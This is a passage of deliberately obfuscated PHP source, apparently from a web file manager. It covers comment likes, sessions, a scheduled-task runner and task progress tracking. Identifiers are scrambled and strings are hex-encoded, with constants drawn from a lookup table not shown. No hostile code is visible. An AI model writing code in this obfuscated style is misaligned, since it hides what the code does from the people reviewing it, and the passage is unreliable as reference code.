$£œÄÀø°; } $Şê©£õ½ = $this->field($¦Ãµæ“Á[1676])->where($ç¢ÕÚ–×)->limit(500)->select(); $Şê©£õ½ = array_to_keyvalue($Şê©£õ½, $¦Ãµæ“Á[12], $¦Ãµæ“Á[1676]); $£œÄÀø°[$¦Ãµæ“Á[1902]] = Model($¦Ãµæ“Á[533])->userListInfo($Şê©£õ½); return $£œÄÀø°; } public function prasiseUserList($èŞÆª¯) { $ÉÈŸĞÃ• =& $_SERVER[¹ş¤¶ĞÖ]; $Ü™ğÙşÆ = array($ÉÈŸĞÃ•[1903] => $èŞÆª¯); $‡ªˆâøÔ = $this->where($Ü™ğÙşÆ)->find(); $‘Ş¿Ğí÷ = _get($‡ªˆâøÔ, $ÉÈŸĞÃ•[1898], 0); $âíüøÇï = array($ÉÈŸĞÃ•[284] => $‘Ş¿Ğí÷, $ÉÈŸĞÃ•[1902] => array()); if (!$‘Ş¿Ğí÷) { return $âíüøÇï; } $İªßñ™ = Model($ÉÈŸĞÃ•[1904])->field($ÉÈŸĞÃ•[1676])->where($Ü™ğÙşÆ)->limit(500)->select(); $İªßñ™ = array_to_keyvalue($İªßñ™, $ÉÈŸĞÃ•[12], $ÉÈŸĞÃ•[1676]); $âíüøÇï[$ÉÈŸĞÃ•[1902]] = Model($ÉÈŸĞÃ•[533])->userListInfo($İªßñ™); return $âíüøÇï; } public function remove($¡ÉŸ‡Ü¥) { $ÀÛ–ë’ =& $_SERVER[¹ş¤¶ĞÖ]; $º˜Ì´í¶ = array($ÀÛ–ë’[1896] => $¡ÉŸ‡Ü¥); $İÅ‰œøœ = $this->where($º˜Ì´í¶)->find(); if ($İÅ‰œøœ[$ÀÛ–ë’[1895]]) { $this->where(array($ÀÛ–ë’[1896] => $İÅ‰œøœ[$ÀÛ–ë’[1895]]))->setAdd($ÀÛ–ë’[1897], -1); } return $this->where($º˜Ì´í¶)->delete(); } public function edit($–‘ÖÔÀ, $Üüôªñü) { $•Š–ï»— =& $_SERVER[¹ş¤¶ĞÖ]; $Û¶£˜© = array($•Š–ï»—[1896] => $–‘ÖÔÀ); return $this->where($Û¶£˜©)->save(array($•Š–ï»—[1905] => $Üüôªñü)); } public function prasise($ŸãıÄª¿) { $Ğ¯¡…áÒ =& $_SERVER[¹ş¤¶ĞÖ]; $ÖÈÀëš = Model($Ğ¯¡…áÒ[1906]); $ •‚©÷‹ = array($Ğ¯¡…áÒ[1896] => $ŸãıÄª¿, $Ğ¯¡…áÒ[1667] => USER_ID); $òâ­ú…‚ = $ÖÈÀëš->where($ •‚©÷‹)->find(); if (!$òâ­ú…‚) { $ÖÈÀëš->add($ •‚©÷‹); $ë…»ğÕ = $this->where(array($Ğ¯¡…áÒ[1896] => $ŸãıÄª¿))->setAdd($Ğ¯¡…áÒ[1898], 1); } else { $ÖÈÀëš->where($ •‚©÷‹)->delete(); $ë…»ğÕ = $this->where(array($Ğ¯¡…áÒ[1896] => $ŸãıÄª¿))->setAdd($Ğ¯¡…áÒ[1898], -1); } return $ë…»ğÕ; } public function targetInfo($öÜÙî¦ò, $¯‘º‚Î ) { $‡ò‡¯Ü› =& $_SERVER[¹ş¤¶ĞÖ]; $­İ„ÜıÙ = array($‡ò‡¯Ü›[605] => $öÜÙî¦ò, $‡ò‡¯Ü›[606] => $¯‘º‚Î ); $¥‘Êˆ™È = $this->where($­İ„ÜıÙ)->count(); $§‘Şü½ñ = "\122\111\x47\110\124\x20\x4a\x4f\111\x4e\x20{$this->tablePrefix}\x63\157\155\x6d\145\156\x74\137\160\162\x61\151\163\145\40\163\164\x61\x72\x20\x6f\156\x20\143\x6f\155\x6d\145\x6e\x74\x2e\143\157\155\155\145\x6e\x74\111\104\x20\75\x20\163\x74\141\x72\56\x63\x6f\x6d\x6d\145\x6e\x74\111\104"; $ÇÂûó‰… = $this->alias($‡ò‡¯Ü›[383])->where($­İ„ÜıÙ)->join($§‘Şü½ñ, $‡ò‡¯Ü›[1907])->count(); $ääğ‘Ëˆ = array($‡ò‡¯Ü›[1908] => $¥‘Êˆ™È, $‡ò‡¯Ü›[1909] => $ÇÂûó‰…); return $ääğ‘Ëˆ; } public function listData($è…³œÇ) { $Ù¥ñ¢ÛÍ =& $_SERVER[¹ş¤¶ĞÖ]; if (isset($è…³œÇ[$Ù¥ñ¢ÛÍ[1910]])) { if ($è…³œÇ[$Ù¥ñ¢ÛÍ[1910]]) { $è…³œÇ[$Ù¥ñ¢ÛÍ[1903]] = array($Ù¥ñ¢ÛÍ[1047], intval($è…³œÇ[$Ù¥ñ¢ÛÍ[1910]])); } unset($è…³œÇ[$Ù¥ñ¢ÛÍ[1910]]); } if (isset($è…³œÇ[$Ù¥ñ¢ÛÍ[1911]])) { if ($è…³œÇ[$Ù¥ñ¢ÛÍ[1911]]) { $è…³œÇ[$Ù¥ñ¢ÛÍ[1903]] = array($Ù¥ñ¢ÛÍ[1044], intval($è…³œÇ[$Ù¥ñ¢ÛÍ[1911]])); } unset($è…³œÇ[$Ù¥ñ¢ÛÍ[1911]]); } return $this->_listData($è…³œÇ); } private function _listData($¨¿¿†ä¾) { $Éè®¹ĞÆ =& $_SERVER[¹ş¤¶ĞÖ]; $Î¦â·á = $this->where($¨¿¿†ä¾)->_makeOrder()->selectPage(100); $this->_listAppendParent($Î¦â·á[$Éè®¹ĞÆ[398]]); $this->_listAppendUser($Î¦â·á[$Éè®¹ĞÆ[398]]); $this->_listAppendMeta($Î¦â·á[$Éè®¹ĞÆ[398]]); return $Î¦â·á; } private function _makeOrder() { $­¼ë…ˆ¹ =& $_SERVER[¹ş¤¶ĞÖ]; $«ùûÑÀ¡ = array($­¼ë…ˆ¹[1898], $­¼ë…ˆ¹[1897], $­¼ë…ˆ¹[201]); $Å·©¾Úâ = Input::get($­¼ë…ˆ¹[486], $­¼ë…ˆ¹[7], $­¼ë…ˆ¹[452], $«ùûÑÀ¡); $ÅƒÎê’Æ = Input::get($­¼ë…ˆ¹[487], $­¼ë…ˆ¹[7], $­¼ë…ˆ¹[1669], array($­¼ë…ˆ¹[1912], $­¼ë…ˆ¹[482])); $Ÿ­”×°Ó = $Å·©¾Úâ . $­¼ë…ˆ¹[53] . $ÅƒÎê’Æ; return $this->order($Ÿ­”×°Ó); } private function _listAppendParent(&$ı´éûÉ) { $÷ùæó½’ =& $_SERVER[¹ş¤¶ĞÖ]; $ı¸¾Àş‚ = array_unique(array_to_keyvalue($ı´éûÉ, $÷ùæó½’[12], $÷ùæó½’[1895])); $ı¸¾Àş‚ = array_remove_value($ı¸¾Àş‚, $÷ùæó½’[198]); if (!$ı¸¾Àş‚) { return; } $şº‚©— = $this->where(array($÷ùæó½’[1896] => array($÷ùæó½’[7], $ı¸¾Àş‚)))->select(); $şº‚©— = array_to_keyvalue($şº‚©—, $÷ùæó½’[1903]); foreach ($ı´éûÉ as &$Ï¶ş¨‹Ş) { if (isset($şº‚©—[$Ï¶ş¨‹Ş[$÷ùæó½’[1895]]])) { $Ï¶ş¨‹Ş[$÷ùæó½’[1913]] = $şº‚©—[$Ï¶ş¨‹Ş[$÷ùæó½’[1895]]]; } } unset($Ï¶ş¨‹Ş); } private function _listAppendUser(&$Íó£â•Á) { $Êøäˆ— =& $_SERVER[¹ş¤¶ĞÖ]; $øó¿ææ— = array_unique(array_to_keyvalue($Íó£â•Á, $Êøäˆ—[12], $Êøäˆ—[1676])); $øó¿ææ— = array_remove_value($øó¿ææ—, $Êøäˆ—[198]); if (count($øó¿ææ—) == 0) { return; } foreach ($Íó£â•Á as $¹Û³¶²š) { if (isset($¹Û³¶²š[$Êøäˆ—[1913]])) { $øó¿ææ—[] = $¹Û³¶²š[$Êøäˆ—[1913]][$Êøäˆ—[1676]]; } } $ ”æ¶‹ = Model($Êøäˆ—[554])->userListInfo($øó¿ææ—); foreach ($Íó£â•Á as &$¹Û³¶²š) { $¹Û³¶²š[$Êøäˆ—[619]] = $ ”æ¶‹[$¹Û³¶²š[$Êøäˆ—[1676]]]; if (isset($¹Û³¶²š[$Êøäˆ—[1913]])) { $¹Û³¶²š[$Êøäˆ—[1913]][$Êøäˆ—[619]] = $ ”æ¶‹[$¹Û³¶²š[$Êøäˆ—[1913]][$Êøäˆ—[1676]]]; } } unset($¹Û³¶²š); } private function _listAppendMeta(&$²óû‚…¿) { $ï®ú©Øİ =& $_SERVER[¹ş¤¶ĞÖ]; $Ñ¹¯¯¯ = array_unique(array_to_keyvalue($²óû‚…¿, $ï®ú©Øİ[12], $ï®ú©Øİ[1903])); $Ñ¹¯¯¯ = array_remove_value($Ñ¹¯¯¯, $ï®ú©Øİ[198]); if (!$Ñ¹¯¯¯) { return; } foreach ($²óû‚…¿ as $îúàŠ×¦) { if (isset($îúàŠ×¦[$ï®ú©Øİ[1913]])) { $Ñ¹¯¯¯[] = $îúàŠ×¦[$ï®ú©Øİ[1913]][$ï®ú©Øİ[1903]]; } } $¥ó†Ãş¢ = $this->metaList($Ñ¹¯¯¯); if (!$¥ó†Ãş¢) { return !1; } foreach ($²óû‚…¿ as &$îúàŠ×¦) { $îúàŠ×¦[$ï®ú©Øİ[495]] = $¥ó†Ãş¢[$îúàŠ×¦[$ï®ú©Øİ[1903]]]; if (isset($îúàŠ×¦[$ï®ú©Øİ[1913]])) { $îúàŠ×¦[$ï®ú©Øİ[1913]][$ï®ú©Øİ[495]] = $¥ó†Ãş¢[$îúàŠ×¦[$ï®ú©Øİ[1913]][$ï®ú©Øİ[1903]]]; } } unset($îúàŠ×¦); } private function metaList($Ç©çÑµò) { $µ‘Ÿ‘óœ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$Ç©çÑµò) { return array(); } $áœ”Ûœ = array($µ‘Ÿ‘óœ[1903] => array($µ‘Ÿ‘óœ[7], $Ç©çÑµò)); $ø»ë³í² = Model($µ‘Ÿ‘óœ[1914])->where($áœ”Ûœ)->select(); $ø»ë³í² = array_to_keyvalue_group($ø»ë³í², $µ‘Ÿ‘óœ[1903]); foreach ($ø»ë³í² as $‚È™‹×° => $ĞˆãŸ»¦) { $‘Äœº¿õ = array(); foreach ($ĞˆãŸ»¦ as $ÑêÙÊ²±) { $‘Äœº¿õ[$ÑêÙÊ²±[$µ‘Ÿ‘óœ[94]]] = $ÑêÙÊ²±[$µ‘Ÿ‘óœ[403]]; } $ø»ë³í²[$‚È™‹×°] = $‘Äœº¿õ; } return $ø»ë³í² ? $ø»ë³í² : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\137\146\x69\154\145\x5f\x63\157\156\164\x65\x6e\164\x73"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\x65\124\151\155\145", "\164\x69\155\x65", "\x69\x6e\x73\x65\x72\x74", "\146\165\x6e\x63\164\151\x6f\x6e")); } goto F‹ÏÇ†äµ÷; c¢Ÿˆˆ®ø£: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $¤Ï¨İ®Ã =& $_SERVER[¹ş¤¶ĞÖ]; static $§ö¼ü¨€ = false; if ($§ö¼ü¨€) { return $§ö¼ü¨€; } $Ñ‘÷“âÅ = $GLOBALS[$¤Ï¨İ®Ã[6]][$¤Ï¨İ®Ã[378]]; self::$sessionTime = $Ñ‘÷“âÅ[$¤Ï¨İ®Ã[1629]]; $è™²µ = isset($GLOBALS[$¤Ï¨İ®Ã[1630]]) ? $GLOBALS[$¤Ï¨İ®Ã[1630]] : SESSION_ID; if (Cookie::get($è™²µ)) { self::$sessionSign = Cookie::get($è™²µ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } Cookie::setSafe($è™²µ, self::$sessionSign, self::$sessionTime); $ÛÚÓë¯ = $Ñ‘÷“âÅ[$¤Ï¨İ®Ã[1631]]; $À££ö¾° = $Ñ‘÷“âÅ[$ÛÚÓë¯]; $ÚËÒõí® = $Ñ‘÷“âÅ[$¤Ï¨İ®Ã[854]]; switch ($ÛÚÓë¯) { case $¤Ï¨İ®Ã[21]: self::$handle = Model($¤Ï¨İ®Ã[855]); break; case $¤Ï¨İ®Ã[856]: self::$handle = new CacheRedis($À££ö¾°, $ÚËÒõí®); break; case $¤Ï¨İ®Ã[857]: self::$handle = new CacheMemcached($À££ö¾°, $ÚËÒõí®); break; case $¤Ï¨İ®Ã[200]: $À££ö¾°[$¤Ï¨İ®Ã[84]] = $À££ö¾°[$¤Ï¨İ®Ã[84]] . $¤Ï¨İ®Ã[1632]; self::$handle = new CacheFile($À££ö¾°, $ÚËÒõí®); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $§ö¼ü¨€ = new self(); return $§ö¼ü¨€; } public static function getBySign($úÍôºÏÖ) { $¶’ùŞ© = self::$handle->get($úÍôºÏÖ); $¶’ùŞ© = unserialize($¶’ùŞ©); return is_array($¶’ùŞ©) ? $¶’ùŞ© : array(); } public static function setBySign($î³«…£, $å—†øã±) { CacheLock::lock($î³«…£); self::$handle->set($î³«…£, serialize($å—†øã±), self::$sessionTime); CacheLock::unlock($î³«…£); } public static function sign($§¾ü‹á = false) { $§¾ü‹á && (self::$sessionSign = $§¾ü‹á); self::init(); return self::$sessionSign; } public static function set($˜«•èúÆ, $…íŸ×óì = false) { self::init(); if (is_array($˜«•èúÆ)) { foreach ($˜«•èúÆ as $Ê´ÕÅĞ => $ìë¦ÁÅ) { array_set_value(self::$data, $Ê´ÕÅĞ, $ìë¦ÁÅ); } } else { array_set_value(self::$data, $˜«•èúÆ, $…íŸ×óì); } self::setBySign(self::$sessionSign, self::$data); } public static function get($¸¢îóõÁ = false) { self::init(); if (!$¸¢îóõÁ) { return self::$data; } return array_get_value(self::$data, $¸¢îóõÁ); } public static function remove($·éûÙüƒ) { self::init(); unset(self::$data[$·éûÙüƒ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¹ş¤¶ĞÖ][859])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $°æŞÊâß =& $_SERVER[¹ş¤¶ĞÖ]; if (self::valueGet($°æŞÊâß[776]) != $°æŞÊâß[88]) { return; } if (self::valueGet($°æŞÊâß[1633]) == $°æŞÊâß[88]) { $•±ÉÁê = self::valueGet($°æŞÊâß[1634]); if (time() - $•±ÉÁê > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$°æŞÊâß[1635]] = 1; self::valueSet($°æŞÊâß[1633], $°æŞÊâß[88]); self::log($°æŞÊâß[1636] . ACTION . $°æŞÊâß[1637]); $_SERVER[$°æŞÊâß[1638]] = $°æŞÊâß[1639]; Session::$data = array(); Session::$sessionSign = $°æŞÊâß[12]; $GLOBALS[$°æŞÊâß[523]] = 1; Hook::bind($°æŞÊâß[1640], $°æŞÊâß[1641]); $ÁÔÇ¢ÙÊ = 0; while (!0) { self::cacheClear(); if (self::valueGet($°æŞÊâß[776]) != $°æŞÊâß[88]) { self::valueSet($°æŞÊâß[1633], $°æŞÊâß[198]); self::log($°æŞÊâß[1642]); die; } $Ñá§ôéº = time(); if ($Ñá§ôéº - $ÁÔÇ¢ÙÊ >= 60) { self::valueSet(array($°æŞÊâß[1633] => $°æŞÊâß[88], $°æŞÊâß[1634] => $Ñá§ôéº), !1); $ÁÔÇ¢ÙÊ = $Ñá§ôéº; } if (!file_exists(USER_SYSTEM . $°æŞÊâß[1643])) { self::valueSet(array($°æŞÊâß[1633] => $°æŞÊâß[198], $°æŞÊâß[776] => $°æŞÊâß[198]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $ùÄ¿ÏÊè =& $_SERVER[¹ş¤¶ĞÖ]; http_close(); self::valueSet($ùÄ¿ÏÊè[776], $ùÄ¿ÏÊè[198]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ùÄ¿ÏÊè[1633] => $ùÄ¿ÏÊè[198], $ùÄ¿ÏÊè[776] => $ùÄ¿ÏÊè[88]), !1); } public static function taskSwitch() { $¸§àğÁ =& $_SERVER[¹ş¤¶ĞÖ]; $¦ï´øë = self::valueGet($¸§àğÁ[776]) == $¸§àğÁ[88] ? $¸§àğÁ[198] : $¸§àğÁ[88]; self::valueSet($¸§àğÁ[776], $¦ï´øë); } public static function shutdownEvent() { $É¬Í»¼Æ =& $_SERVER[¹ş¤¶ĞÖ]; self::valueSet($É¬Í»¼Æ[1633], $É¬Í»¼Æ[198]); self::log($É¬Í»¼Æ[1644]); } public static function config($¢™Çã§ó, $º˜Í€˜¬) { self::valueSet($_SERVER[¹ş¤¶ĞÖ][776], $¢™Çã§ó); } private static function taskRunAll() { $£ã³ºÓí =& $_SERVER[¹ş¤¶ĞÖ]; $ƒ‰¬Óû¤ = timeFloat(); $ İŸ†“¿ = Model($£ã³ºÓí[1645])->listData(); $Å…¬¥÷· = count($ İŸ†“¿); for ($Á¼õ¥ÖÛ = 0; $Á¼õ¥ÖÛ < $Å…¬¥÷·; $Á¼õ¥ÖÛ++) { $††»óê¡ = $ İŸ†“¿[$Á¼õ¥ÖÛ]; if (!$††»óê¡[$£ã³ºÓí[428]] || $††»óê¡[$£ã³ºÓí[1646]] != $£ã³ºÓí[88]) { continue; } if (!self::taskTimeCheck($††»óê¡)) { continue; } self::taskRun($††»óê¡); } Hook::trigger($£ã³ºÓí[1647]); self::taskQueueRun($ƒ‰¬Óû¤); } private static function taskQueueRun($–áñÄÌş) { $ÙÄ·ß´÷ = 10; while (!0) { $¢ë¿³° = TaskQueue::run(); if ($¢ë¿³° === !1) { break; } if (timeFloat() - $–áñÄÌş >= $ÙÄ·ß´÷) { break; } } } private static function taskTimeCheck($öÑßìŒÇ) { $×ˆÀ› =& $_SERVER[¹ş¤¶ĞÖ]; $±ø†›½³ = json_decode($öÑßìŒÇ[$×ˆÀ›[180]], !0); $¿…Ò‰Ø× = intval($öÑßìŒÇ[$×ˆÀ›[1634]]); $¢”ÌÈ¥Ä = strtotime($×ˆÀ›[1648] . $±ø†›½³[$×ˆÀ›[1649]] . $×ˆÀ›[1650]) - strtotime($×ˆÀ›[1651]); $¸×ş§˜ò = time() - strtotime(date($×ˆÀ›[1652]) . $×ˆÀ›[1653]); $¶°­‰İˆ = $¸×ş§˜ò >= $¢”ÌÈ¥Ä && $¸×ş§˜ò <= $¢”ÌÈ¥Ä + 3600; switch ($±ø†›½³[$×ˆÀ›[33]]) { case $×ˆÀ›[1654]: if (time() - $¿…Ò‰Ø× < 3600 * 24 * 30) { return !1; } if ($±ø†›½³[$×ˆÀ›[1654]] == date($×ˆÀ›[1655]) && $¶°­‰İˆ) { return !0; } break; case $×ˆÀ›[1656]: if (time() - $¿…Ò‰Ø× < 3600 * 24 * 7) { return !1; } $Ÿ¡Êıîô = date($×ˆÀ›[1657]) == 0 ? 7 : date($×ˆÀ›[1657]); if ($±ø†›½³[$×ˆÀ›[1656]] == $Ÿ¡Êıîô && $¶°­‰İˆ) { return !0; } break; case $×ˆÀ›[1649]: if (time() - $¿…Ò‰Ø× < 3600 * 24) { return !1; } if ($¶°­‰İˆ) { return !0; } break; case $×ˆÀ›[1658]: if (time() - $¿…Ò‰Ø× >= floatval($±ø†›½³[$×ˆÀ›[1658]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $û¶ùò¤ç =& $_SERVER[¹ş¤¶ĞÖ]; static $ç°§÷å± = 0; $ù¶Å½£ = 300; if (!$ç°§÷å±) { $ç°§÷å± = time(); } if (time() - $ç°§÷å± < $ù¶Å½£) { return; } $ç°§÷å± = time(); $ÅÚÓÇİ = Model($û¶ùò¤ç[533])->db($û¶ùò¤ç[12]); if ($ÅÚÓÇİ) { $ÅÚÓÇİ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($û¶ùò¤ç[1659], $û¶ùò¤ç[1660]); die; } } public static function taskRun($éÎÂô‹î) { $³•ì”§Â =& $_SERVER[¹ş¤¶ĞÖ]; self::log($³•ì”§Â[1661] . $éÎÂô‹î[$³•ì”§Â[428]] . $³•ì”§Â[1662] . $éÎÂô‹î[$³•ì”§Â[32]] . $³•ì”§Â[1663] . $éÎÂô‹î[$³•ì”§Â[1664]]); Model($³•ì”§Â[1645])->run($éÎÂô‹î[$³•ì”§Â[428]]); $²ì‚¥é× = timeFloat(); $ñ¸ùØä½ = $³•ì”§Â[12]; switch ($éÎÂô‹î[$³•ì”§Â[33]]) { case $³•ì”§Â[336]: $Ë‚ÙÍËö = url_request($éÎÂô‹î[$³•ì”§Â[1664]], $³•ì”§Â[230], !1, !1, !1, !1, 10); if ($Ë‚ÙÍËö[$³•ì”§Â[776]]) { $ñ¸ùØä½ = strlen($Ë‚ÙÍËö[$³•ì”§Â[1235]]); } break; case $³•ì”§Â[229]: $ñ¸ùØä½ = Hook::apply($éÎÂô‹î[$³•ì”§Â[1664]]); default: break; } Model($³•ì”§Â[1665])->add(array($³•ì”§Â[1666] => $³•ì”§Â[12], $³•ì”§Â[1667] => $³•ì”§Â[198], $³•ì”§Â[33] => $³•ì”§Â[1668] . $éÎÂô‹î[$³•ì”§Â[428]], $³•ì”§Â[1669] => json_encode(array($³•ì”§Â[32] => $éÎÂô‹î[$³•ì”§Â[32]], $³•ì”§Â[1670] => timeFloat() - $²ì‚¥é×, $³•ì”§Â[322] => $ñ¸ùØä½)))); $· ÑĞ = $ñ¸ùØä½ ? $³•ì”§Â[1671] . $ñ¸ùØä½ : $³•ì”§Â[12]; self::log($³•ì”§Â[1672] . $éÎÂô‹î[$³•ì”§Â[428]] . $³•ì”§Â[164] . $· ÑĞ); return !0; } public static function valueGet($şê­ÃŞŠ) { $€ÌĞ¤ =& $_SERVER[¹ş¤¶ĞÖ]; $¶¯–íÚÚ = $€ÌĞ¤[1673]; $Ö†Í®ÏĞ = Model($€ÌĞ¤[464])->get($şê­ÃŞŠ, $¶¯–íÚÚ); if (is_null($Ö†Í®ÏĞ)) { Model($€ÌĞ¤[464])->set($€ÌĞ¤[776], $€ÌĞ¤[88], $¶¯–íÚÚ); Model($€ÌĞ¤[464])->set($€ÌĞ¤[1633], $€ÌĞ¤[198], $¶¯–íÚÚ); $Ö†Í®ÏĞ = Model($€ÌĞ¤[464])->get($şê­ÃŞŠ, $¶¯–íÚÚ); } return $Ö†Í®ÏĞ; } private static function valueSet($Î’ÒíÙ˜, $ÙÊöÆô) { $Ê€ôû‹š =& $_SERVER[¹ş¤¶ĞÖ]; $˜‹Üµ› = $Ê€ôû‹š[1674]; CacheLock::lock($˜‹Üµ›); $á¹ë˜Öó = Model($Ê€ôû‹š[464])->set($Î’ÒíÙ˜, $ÙÊöÆô, $Ê€ôû‹š[1673]); CacheLock::unlock($˜‹Üµ›); return $á¹ë˜Öó; } protected static function log($ ¸âÍÊ‘) { write_log($ ¸âÍÊ‘, $_SERVER[¹ş¤¶ĞÖ][1660]); } private static function cacheClear() { $ ¦™åã =& $_SERVER[¹ş¤¶ĞÖ]; Cache::clearMemory(Model($ ¦™åã[464])->cacheKey($ ¦™åã[1673])); Cache::clearMemory(Model($ ¦™åã[464])->cacheKey($ ¦™åã[1675])); Model($ ¦™åã[1645])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\157\x70"; const STATYS_RUNNING = "\162\x75\156\x6e\151\156\147"; const STATYS_KILL = "\153\x69\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($§’ÈñÍ, $¨Í…º¹ = '', $®×í²Ú = 0, $™—àßƒ± = '') { $Ñ×¯ãÌˆ =& $_SERVER[¹ş¤¶ĞÖ]; if (self::get($§’ÈñÍ)) { return; } $this->task = array($Ñ×¯ãÌˆ[428] => $§’ÈñÍ, $Ñ×¯ãÌˆ[1676] => USER_ID, $Ñ×¯ãÌˆ[1574] => $™—àßƒ±, $Ñ×¯ãÌˆ[482] => $Ñ×¯ãÌˆ[12], $Ñ×¯ãÌˆ[33] => $¨Í…º¹, $Ñ×¯ãÌˆ[1097] => $Ñ×¯ãÌˆ[12], $Ñ×¯ãÌˆ[812] => $®×í²Ú, $Ñ×¯ãÌˆ[1677] => 0, $Ñ×¯ãÌˆ[1678] => 0, $Ñ×¯ãÌˆ[1679] => 0, $Ñ×¯ãÌˆ[1680] => timeFloat(), $Ñ×¯ãÌˆ[1681] => 0, $Ñ×¯ãÌˆ[1682] => 0, $Ñ×¯ãÌˆ[1683] => 0, $Ñ×¯ãÌˆ[1684] => 0, $Ñ×¯ãÌˆ[776] => $Ñ×¯ãÌˆ[1633]); $GLOBALS[$Ñ×¯ãÌˆ[1685]] = 1; Hook::bind($Ñ×¯ãÌˆ[1640], array($this, $Ñ×¯ãÌˆ[1686])); Hook::bind($Ñ×¯ãÌˆ[1687], array($this, $Ñ×¯ãÌˆ[1688])); $this->startAfter(); Hook::trigger($Ñ×¯ãÌˆ[1689], $this->task); $this->task[$Ñ×¯ãÌˆ[1682]] = timeFloat(); } public function end($ñ–ûüÜ¯ = '') { $â³ÍïŞÙ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$â³ÍïŞÙ[1682]]) { self::valueSet($this->task[$â³ÍïŞÙ[428]], !1); } $this->isEnd = !0; if ($ñ–ûüÜ¯) { $this->task[$â³ÍïŞÙ[482]] = $ñ–ûüÜ¯; } self::log($â³ÍïŞÙ[1690] . $this->task[$â³ÍïŞÙ[428]] . $â³ÍïŞÙ[1691] . sprintf($â³ÍïŞÙ[876], timeFloat() - $this->task[$â³ÍïŞÙ[1680]]) . $â³ÍïŞÙ[1692]); Hook::unbind($â³ÍïŞÙ[1640], array($this, $â³ÍïŞÙ[1686])); Hook::unbind($â³ÍïŞÙ[1687], array($this, $â³ÍïŞÙ[1688])); $this->endAfter(); $“Şì”Ó  = $this->task; $this->task = !1; Hook::trigger($â³ÍïŞÙ[1693], $“Şì”Ó ); } public function update($íÒ¥¦´¥ = 0, $½ÔÇÀ¢¨ = false) { $ã²İ¹¬ =& $_SERVER[¹ş¤¶ĞÖ]; $°¢ñğ–Ï =& $this->task; if (!$°¢ñğ–Ï) { return; } $°¢ñğ–Ï[$ã²İ¹¬[1677]] += $íÒ¥¦´¥; $°¢ñğ–Ï[$ã²İ¹¬[1681]] = timeFloat(); if ($°¢ñğ–Ï[$ã²İ¹¬[812]]) { if ($°¢ñğ–Ï[$ã²İ¹¬[812]] < $°¢ñğ–Ï[$ã²İ¹¬[1677]]) { $°¢ñğ–Ï[$ã²İ¹¬[812]] = $°¢ñğ–Ï[$ã²İ¹¬[1677]]; } $ÚÃí¤Õ = timeFloat() - $°¢ñğ–Ï[$ã²İ¹¬[1680]] - $°¢ñğ–Ï[$ã²İ¹¬[1683]]; if ($ÚÃí¤Õ <= 0) { $ÚÃí¤Õ = 0.001; } $°¢ñğ–Ï[$ã²İ¹¬[1678]] = $°¢ñğ–Ï[$ã²İ¹¬[1677]] / $°¢ñğ–Ï[$ã²İ¹¬[812]]; $°¢ñğ–Ï[$ã²İ¹¬[1679]] = $°¢ñğ–Ï[$ã²İ¹¬[1677]] / $ÚÃí¤Õ; if ($°¢ñğ–Ï[$ã²İ¹¬[1678]] > 0) { $°¢ñğ–Ï[$ã²İ¹¬[1684]] = $ÚÃí¤Õ * (1 - $°¢ñğ–Ï[$ã²İ¹¬[1678]]) / $°¢ñğ–Ï[$ã²İ¹¬[1678]]; } $°¢ñğ–Ï[$ã²İ¹¬[1684]] = $°¢ñğ–Ï[$ã²İ¹¬[1684]] <= 0 ? 0 : $°¢ñğ–Ï[$ã²İ¹¬[1684]]; } $this->updateAfter(); $ô‰¾Ö¨¨ = 0.2; if (timeFloat() - $°¢ñğ–Ï[$ã²İ¹¬[1682]] < $ô‰¾Ö¨¨ && !$½ÔÇÀ¢¨) { return; } $§’ùßøÇ = self::get($°¢ñğ–Ï[$ã²İ¹¬[428]]); $Â©”€ù² = $§’ùßøÇ[$ã²İ¹¬[776]]; if ($Â©”€ù² == self::STATYS_KILL) { $¸øÍ«ŠŞ = array($ã²İ¹¬[1694] => LNG($ã²İ¹¬[1695]), $ã²İ¹¬[1245] => !1); Cache::set($ã²İ¹¬[1696] . $this->task[$ã²İ¹¬[428]], $¸øÍ«ŠŞ, 30); $this->onKill(); $this->end(); die; } else { if ($Â©”€ù² == self::STATYS_STOP) { $™Š†×€È = 2; $§’ùßøÇ[$ã²İ¹¬[1683]] += $™Š†×€È; self::valueSet($°¢ñğ–Ï[$ã²İ¹¬[428]], $§’ùßøÇ); sleep($™Š†×€È); $this->update(); return; } } $°¢ñğ–Ï[$ã²İ¹¬[776]] = $Â©”€ù² ? $Â©”€ù² : $°¢ñğ–Ï[$ã²İ¹¬[776]]; $°¢ñğ–Ï[$ã²İ¹¬[1683]] = $§’ùßøÇ[$ã²İ¹¬[1683]] ? $§’ùßøÇ[$ã²İ¹¬[1683]] : 0; $°¢ñğ–Ï[$ã²İ¹¬[1682]] = timeFloat(); Hook::trigger($ã²İ¹¬[1697], $°¢ñğ–Ï); self::valueSet($°¢ñğ–Ï[$ã²İ¹¬[428]], $°¢ñğ–Ï); } public function onKillSet($€ÖğÒÜò, $Šİ™é ü = array()) { $this->onKillCall = array($€ÖğÒÜò, $Šİ™é ü); } public function onKill() { $İíØ–Õ =& $_SERVER[¹ş¤¶ĞÖ]; self::log($İíØ–Õ[1690] . $this->task[$İíØ–Õ[428]] . $İíØ–Õ[1698]); Hook::trigger($İíØ–Õ[1699], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); 